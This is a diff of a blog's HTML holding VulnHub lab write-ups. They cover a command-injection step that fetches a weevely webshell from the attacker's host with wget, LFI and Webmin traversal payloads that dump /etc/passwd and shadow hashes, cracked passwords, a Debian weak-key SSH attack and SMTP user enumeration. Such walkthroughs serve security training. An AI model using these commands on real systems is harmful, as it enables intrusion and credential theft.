+</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.80.142/b.php?cmd=id
+</span><span class='line'>http://192.168.80.142/b.php?cmd=wget 192.168.80.137/weevely.php.txt -O c.php</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/var/www# weevely http://192.168.80.142/c.php 1234</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Note that there exists also a trivial solution, because users can upload php
+shell to home directory, which can be invoked without any restriction.</p>
+
+<p>If we read the discussion on web server, someone is asking about port knocking.
+We download the data to our server:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@:/etc/knockknock.d/profiles/alamo $
+</span><span class='line'>
+</span><span class='line'>root@kali32:~# find .knockknock/
+</span><span class='line'>.knockknock/
+</span><span class='line'>.knockknock/192.168.80.142
+</span><span class='line'>.knockknock/192.168.80.142/config
+</span><span class='line'>.knockknock/192.168.80.142/counter
+</span><span class='line'>.knockknock/192.168.80.142/mac.key
+</span><span class='line'>.knockknock/192.168.80.142/cipher.key</span></code></pre></td></tr></table></div></figure>
+
+
+<p>From the vulnerable server, we download and use knockknock too:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.knockknock# knockknock -p 22 192.168.80.142
+</span><span class='line'>*** Success: knock sent.
+</span><span class='line'>root@kali32:~/.knockknock# ssh alamo@192.168.80.142
+</span><span class='line'>
+</span><span class='line'>The authenticity of host '192.168.80.142 (192.168.80.142)' can't be established.
+</span><span class='line'>RSA key fingerprint is 03:73:de:c7:17:96:0b:bb:8c:8e:c7:87:9b:5b:d5:c9.
+</span><span class='line'>Are you sure you want to continue connecting (yes/no)?</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We log in as alamo / Ih@cK3dM1cR05oF7.</p>
+
+<p>Because nobody has higher privileges for sudo except www-data, we use the web
+account to obtain root privileges.
+One way of doing this is to change using chown /etc/shadow file permission
+to www-data, move to /tmp and change the root hash to a know one (e.g.
+alamo&rsquo;s). Then we move the shadow file back.</p>
+
+<p>In the end we log in as root with Ih@cK3dM1cR05oF7 password:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># uid=0(root) gid=0(root) groups=0(root)</span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -321,839 +1454,6 @@ PORT STATE SERVICE VERSION
 </span><span class='line'>pcap:!!:14513:0:99999:7:::
 </span><span class='line'>john:$1$zL4.MR4t$26N4YpTGceBO0gTX6TAky1:14513:0:99999:7:::
 </span><span class='line'>harold:$1$Xx6dZdOd$IMOGACl3r757dv17LZ9010:14513:0:99999:7:::</span></code></pre></td></tr></table></div></figure>
-
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/05/10/pwnos-1-dot-0/">pWnOS: 1.0</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-05-10T12:13:34+02:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:13 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Image: <a href="https://www.vulnhub.com/entry/pwnos-10,33/">pWnOS: 1.0</a></p>
-
-<p>Nmap output:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
-</span><span class='line'>22/tcp    open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
-</span><span class='line'>80/tcp    open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
-</span><span class='line'>139/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: MSHOME)
-</span><span class='line'>445/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: MSHOME)
-</span><span class='line'>10000/tcp open  http        MiniServ 0.01 (Webmin httpd)
-</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></code></pre></td></tr></table></div></figure>
-
-
-<p>After a while of browsing the web page, we found trivial LFI vulnerability:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>http://193.168.0.25/index1.php?help=true&connect=../../../../etc/passwd
-</span><span class='line'>
-</span><span class='line'>root:x:0:0:root:/root:/bin/bash
-</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
-</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
-</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
-</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
-</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
-</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
-</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
-</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
-</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh
-</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
-</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
-</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
-</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
-</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
-</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
-</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
-</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
-</span><span class='line'>dhcp:x:100:101::/nonexistent:/bin/false
-</span><span class='line'>syslog:x:101:102::/home/syslog:/bin/false
-</span><span class='line'>klog:x:102:103::/home/klog:/bin/false
-</span><span class='line'>mysql:x:103:107:MySQL Server,,,:/var/lib/mysql:/bin/false
-</span><span class='line'>sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
-</span><span class='line'>vmware:x:1000:1000:vmware,,,:/home/vmware:/bin/bash
-</span><span class='line'>obama:x:1001:1001::/home/obama:/bin/bash
-</span><span class='line'>osama:x:1002:1002::/home/osama:/bin/bash
-</span><span class='line'>yomama:x:1003:1003::/home/yomama:/bin/bash</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We can find a lot of information querying the samba service too:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/vulnhub/pwnos# nmblookup -A 192.168.0.25
-</span><span class='line'>Looking up status of 192.168.0.25
-</span><span class='line'>        UBUNTUVM        &lt;00> -         H &lt;ACTIVE>
-</span><span class='line'>        UBUNTUVM        &lt;03> -         H &lt;ACTIVE>
-</span><span class='line'>        UBUNTUVM        &lt;20> -         H &lt;ACTIVE>
-</span><span class='line'>        ..__MSBROWSE__. &lt;01> - &lt;GROUP> H &lt;ACTIVE>
-</span><span class='line'>        MSHOME          &lt;1d> -         H &lt;ACTIVE>
-</span><span class='line'>        MSHOME          &lt;1e> - &lt;GROUP> H &lt;ACTIVE>
-</span><span class='line'>        MSHOME          &lt;00> - &lt;GROUP> H &lt;ACTIVE>
-</span><span class='line'>
-</span><span class='line'>        MAC Address = 00-00-00-00-00-00
-</span><span class='line'>
-</span><span class='line'>root@kali:~/vulnhub/pwnos# smbclient -L\\UBUNTUVM -I 192.168.0.25 -N
-</span><span class='line'>Anonymous login successful
-</span><span class='line'>Domain=[MSHOME] OS=[Unix] Server=[Samba 3.0.26a]
-</span><span class='line'>
-</span><span class='line'>        Sharename       Type      Comment
-</span><span class='line'>        ---------       ----      -------
-</span><span class='line'>        home            Disk      Home Directory for vmware User
-</span><span class='line'>        print$          Disk      Printer Drivers
-</span><span class='line'>        IPC$            IPC       IPC Service (ubuntuvm)
-</span><span class='line'>Anonymous login successful
-</span><span class='line'>Domain=[MSHOME] OS=[Unix] Server=[Samba 3.0.26a]
-</span><span class='line'>
-</span><span class='line'>        Server               Comment
-</span><span class='line'>        ---------            -------
-</span><span class='line'>        UBUNTUVM             ubuntuvm
-</span><span class='line'>
-</span><span class='line'>        Workgroup            Master
-</span><span class='line'>        ---------            -------
-</span><span class='line'>        MSHOME               UBUNTUVM</span></code></pre></td></tr></table></div></figure>
-
-
-<p>There are a few enumeration modules in metasploit:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(usermap_script) > use auxiliary/scanner/smb/pipe_auditor
-</span><span class='line'>msf auxiliary(pipe_auditor) > setg RHOSTS 192.168.0.25
-</span><span class='line'>RHOSTS => 192.168.0.25
-</span><span class='line'>msf auxiliary(pipe_auditor) > exploit
-</span><span class='line'>
-</span><span class='line'>[*] 192.168.0.25 - Pipes: \netlogon, \lsarpc, \samr, \eventlog, \InitShutdown, \lsass, \ntsvcs, \srvsvc, \wkssvc
-</span><span class='line'>[*] Scanned 1 of 1 hosts (100% complete)
-</span><span class='line'>[*] Auxiliary module execution completed
-</span><span class='line'>
-</span><span class='line'>msf auxiliary(smb_enumshares) > use auxiliary/scanner/smb/smb_enumusers
-</span><span class='line'>msf auxiliary(smb_enumusers) > exploit
-</span><span class='line'>
-</span><span class='line'>[*] 192.168.0.25 UBUNTUVM [ games, nobody, proxy, syslog, www-data, root, news, bin, mail, dhcp, daemon, sshd, man, lp, mysql, gnats, backup, sys, klog, vmware, list, irc, sync, uucp ] ( LockoutTries=0 PasswordMin=5 )
-</span><span class='line'>
-</span><span class='line'>msf auxiliary(smb_login) > use auxiliary/scanner/smb/smb_lookupsid
-</span><span class='line'>msf auxiliary(smb_lookupsid) > exploit
-</span><span class='line'>
-</span><span class='line'>[*] 192.168.0.25 PIPE(LSARPC) LOCAL(UBUNTUVM - 5-21-2952145021-507220021-499326276) DOMAIN(MSHOME - )
-</span><span class='line'>[*] 192.168.0.25 USER=nobody RID=501
-</span><span class='line'>[*] 192.168.0.25 GROUP=None RID=513
-</span><span class='line'>[*] 192.168.0.25 USER=root RID=1000
-</span><span class='line'>[*] 192.168.0.25 USER=daemon RID=1002
-</span><span class='line'>[*] 192.168.0.25 USER=bin RID=1004
-</span><span class='line'>[*] 192.168.0.25 USER=sys RID=1006
-</span><span class='line'>[*] 192.168.0.25 USER=sync RID=1008
-</span><span class='line'>[*] 192.168.0.25 USER=games RID=1010
-</span><span class='line'>[*] 192.168.0.25 USER=man RID=1012
-</span><span class='line'>[*] 192.168.0.25 USER=lp RID=1014
-</span><span class='line'>[*] 192.168.0.25 USER=mail RID=1016
-</span><span class='line'>[*] 192.168.0.25 USER=news RID=1018
-</span><span class='line'>[*] 192.168.0.25 USER=uucp RID=1020
-</span><span class='line'>[*] 192.168.0.25 USER=proxy RID=1026
-</span><span class='line'>[*] 192.168.0.25 USER=www-data RID=1066
-</span><span class='line'>[*] 192.168.0.25 USER=backup RID=1068
-</span><span class='line'>[*] 192.168.0.25 USER=list RID=1076
-</span><span class='line'>[*] 192.168.0.25 USER=irc RID=1078
-</span><span class='line'>[*] 192.168.0.25 USER=gnats RID=1082
-</span><span class='line'>[*] 192.168.0.25 USER=dhcp RID=1200
-</span><span class='line'>[*] 192.168.0.25 USER=syslog RID=1202
-</span><span class='line'>[*] 192.168.0.25 USER=klog RID=1204
-</span><span class='line'>[*] 192.168.0.25 USER=mysql RID=1206
-</span><span class='line'>[*] 192.168.0.25 USER=sshd RID=1208
-</span><span class='line'>[*] 192.168.0.25 USER=vmware RID=3000
-</span><span class='line'>[*] 192.168.0.25 UBUNTUVM [nobody, root, daemon, bin, sys, sync, games, man, lp, mail, news, uucp, proxy, www-data, backup, list, irc, gnats, dhcp, syslog, klog, mysql, sshd, vmware ]
-</span><span class='line'>[*] Scanned 1 of 1 hosts (100% complete)
-</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The webmin is vulnerable and the exploit in metasploit:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>Name: Webmin File Disclosure
-</span><span class='line'>     Module: auxiliary/admin/webmin/file_disclosure
-</span><span class='line'>    License: Metasploit Framework License (BSD)
-</span><span class='line'>       Rank: Normal
-</span><span class='line'>  Disclosed: 2006-06-30</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Basically the exploitation could be performed on command line to disclose arbitrary file, for example:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/webmin/miniserv.conf
-</span><span class='line'>
-</span><span class='line'>http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/webmin/miniserv.users
-</span><span class='line'>
-</span><span class='line'>http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/webmin/miniserv.pem</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow
-</span><span class='line'>
-</span><span class='line'>root:$1$LKrO9Q3N$EBgJhPZFHiKXtK0QRqeSm/:14041:0:99999:7:::
-</span><span class='line'>daemon:*:14040:0:99999:7:::
-</span><span class='line'>bin:*:14040:0:99999:7:::
-</span><span class='line'>sys:*:14040:0:99999:7:::
-</span><span class='line'>sync:*:14040:0:99999:7:::
-</span><span class='line'>games:*:14040:0:99999:7:::
-</span><span class='line'>man:*:14040:0:99999:7:::
-</span><span class='line'>lp:*:14040:0:99999:7:::
-</span><span class='line'>mail:*:14040:0:99999:7:::
-</span><span class='line'>news:*:14040:0:99999:7:::
-</span><span class='line'>uucp:*:14040:0:99999:7:::
-</span><span class='line'>proxy:*:14040:0:99999:7:::
-</span><span class='line'>www-data:*:14040:0:99999:7:::
-</span><span class='line'>backup:*:14040:0:99999:7:::
-</span><span class='line'>list:*:14040:0:99999:7:::
-</span><span class='line'>irc:*:14040:0:99999:7:::
-</span><span class='line'>gnats:*:14040:0:99999:7:::
-</span><span class='line'>nobody:*:14040:0:99999:7:::
-</span><span class='line'>dhcp:!:14040:0:99999:7:::
-</span><span class='line'>syslog:!:14040:0:99999:7:::
-</span><span class='line'>klog:!:14040:0:99999:7:::
-</span><span class='line'>mysql:!:14040:0:99999:7:::
-</span><span class='line'>sshd:!:14040:0:99999:7:::
-</span><span class='line'>vmware:$1$7nwi9F/D$AkdCcO2UfsCOM0IC8BYBb/:14042:0:99999:7:::
-</span><span class='line'>obama:$1$hvDHcCfx$pj78hUduionhij9q9JrtA0:14041:0:99999:7:::
-</span><span class='line'>osama:$1$Kqiv9qBp$eJg2uGCrOHoXGq0h5ehwe.:14041:0:99999:7:::
-</span><span class='line'>yomama:$1$tI4FJ.kP$wgDmweY9SAzJZYqW76oDA.:14041:0:99999:7:::</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Using john on /etc/shadow, we obtain credentials of user vmware for successful login to the system:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>h4ckm3           (vmware)</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The box could be rooted using standard vmsplice exploit.</p>
-
-<p>However, there is another way to get user account. The script
-<a href="https://wiki.debian.org/SSLkeys#Testing_keys_using_dowkd.pl">dowkd.pl</a> ensures
-us that the OpenSSL is vulnerable
-(<a href="https://security-tracker.debian.org/tracker/CVE-2008-0166">CVE-2008-0166</a>).</p>
-
-<p>We download and unpack already generated RSA keys from offensive-security repository:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/debian_ssh_rsa_2048_x86.tar.bz2</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Because usage of weak private keys could be blacklisted on our server, we use
-the following
-<a href="https://unix.stackexchange.com/questions/109908/public-key-f36e8704ea2db360ff42ad26671794d5-blacklisted-see-ssh">instructions</a>
-to enable them.</p>
-
-<p>Basically adding this directive to our ssh_config file should be sufficient:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>UseBlacklistedKeys yes</span></code></pre></td></tr></table></div></figure>
-
-
-<p></p>
-
-<p>In exploitdb, we use python script to try every possible private key:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ python platforms/linux/remote/5720.py /tmp/rsa/2048 192.168.0.25 obama
-</span><span class='line'>
-</span><span class='line'>Key Found in file: dcbe2a56e8cdea6d17495f6648329ee2-4679
-</span><span class='line'>Execute: ssh -lobama -p22 -i /tmp/rsa/2048/dcbe2a56e8cdea6d17495f6648329ee2-4679 192.168.0.25</span></code></pre></td></tr></table></div></figure>
-
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/05/10/de-ice-s2-dot-100/">DE-ICE-S2.100</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-05-10T11:40:38+02:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>11:40 am</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Image: <a href="https://www.vulnhub.com/entry/de-ice-s2100,13/">De-ICE: S2.100</a></p>
-
-<p>Nmap output:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>PORT    STATE  SERVICE  VERSION
-</span><span class='line'>21/tcp  open   ftp      vsftpd 2.0.4
-</span><span class='line'>22/tcp  open   ssh      OpenSSH 4.3 (protocol 1.99)
-</span><span class='line'>25/tcp  open   smtp     Sendmail 8.13.7/8.13.7
-</span><span class='line'>80/tcp  open   http     Apache httpd 2.0.55 ((Unix) PHP/5.1.2)
-</span><span class='line'>110/tcp open   pop3     Openwall popa3d
-</span><span class='line'>143/tcp open   imap     UW imapd 2004.357</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We found out that there is another IP address on the same network:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>Nmap scan report for 192.168.2.101
-</span><span class='line'>Host is up (0.00038s latency).
-</span><span class='line'>Not shown: 999 filtered ports
-</span><span class='line'>PORT   STATE SERVICE
-</span><span class='line'>80/tcp open  http
-</span><span class='line'>MAC Address: 00:0C:29:53:2F:A3 (VMware)</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Enumerating SMTP users, we get:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# for i in $(cat /usr/share/ncrack/default.usr); do echo $i; echo -e "\nehlo lol\nmail from:$i@slax.example.net\nrcpt to:$i\nquit\n" | nc 192.168.2.100 25; done  | grep -i 'Recipient ok' 
-</span><span class='line'>250 2.1.5 root... Recipient ok
-</span><span class='line'>250 2.1.5 operator... Recipient ok
-</span><span class='line'>250 2.1.5 manager... Recipient ok
-</span><span class='line'>250 2.1.5 Manager... Recipient ok
-</span><span class='line'>250 2.1.5 adm... Recipient ok
-</span><span class='line'>250 2.1.5 lp... Recipient ok
-</span><span class='line'>250 2.1.5 MAIL... Recipient ok
-</span><span class='line'>250 2.1.5 system... Recipient ok
-</span><span class='line'>250 2.1.5 MANAGER... Recipient ok
-</span><span class='line'>250 2.1.5 OPERATOR... Recipient ok
-</span><span class='line'>250 2.1.5 halt... Recipient ok
-</span><span class='line'>250 2.1.5 Root... Recipient ok
-</span><span class='line'>250 2.1.5 SYSTEM... Recipient ok
-</span><span class='line'>250 2.1.5 ftp... Recipient ok
-</span><span class='line'>250 2.1.5 mail... Recipient ok
-</span><span class='line'>250 2.1.5 toor... Recipient ok
-</span><span class='line'>250 2.1.5 ROOT... Recipient ok
-</span><span class='line'>250 2.1.5 shutdown... Recipient ok
-</span><span class='line'>250 2.1.5 bin... Recipient ok
-</span><span class='line'>250 2.1.5 POSTMASTER... Recipient ok
-</span><span class='line'>250 2.1.5 nobody... Recipient ok
-</span><span class='line'>250 2.1.5 games... Recipient ok
-</span><span class='line'>250 2.1.5 postmaster... Recipient ok
-</span><span class='line'>250 2.1.5 NEWS... Recipient ok
-</span><span class='line'>250 2.1.5 sync... Recipient ok
-</span><span class='line'>250 2.1.5 INGRES... Recipient ok
-</span><span class='line'>250 2.1.5 daemon... Recipient ok
-</span><span class='line'>250 2.1.5 uucp... Recipient ok
-</span><span class='line'>250 2.1.5 Operator... Recipient ok
-</span><span class='line'>250 2.1.5 webmaster... Recipient ok
-</span><span class='line'>250 2.1.5 news... Recipient ok</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We used CEWL to create wordlist (userlist.txt) to reveal another user accounts.
-Before we use this command, it&rsquo;s good to check if the disk is not full for
-proper SMTP functionality.</p>
